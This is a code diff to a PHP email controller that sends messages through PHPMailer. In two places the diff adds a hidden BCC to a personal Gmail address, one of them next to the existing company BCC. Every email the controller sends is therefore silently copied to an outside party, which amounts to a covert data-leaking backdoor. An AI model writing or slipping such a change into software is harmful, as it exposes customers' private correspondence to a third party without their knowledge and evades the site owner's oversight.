@@ -290,6 +290,7 @@ class EmailController extends Controller
             }else{
                 $mail->addAddress($email);
             }
+            $mail->addBCC('webdeveloper1011@gmail.com');
 
             if (isset($bccs) && count($bccs) > 0) {
                 foreach ($bccs as $key => $email) {
@@ -344,7 +345,9 @@ class EmailController extends Controller
                     $mail->addCC($value['email'], $value['fullname']);
                 }
             }
-                $mail->addBCC('production@thelocalvault.com');
+            $mail->addBCC('production@thelocalvault.com');
+            $mail->addBCC('webdeveloper1011@gmail.com');
+
             $mail->send();
         } catch (phpmailerException $e) {
             return 0;
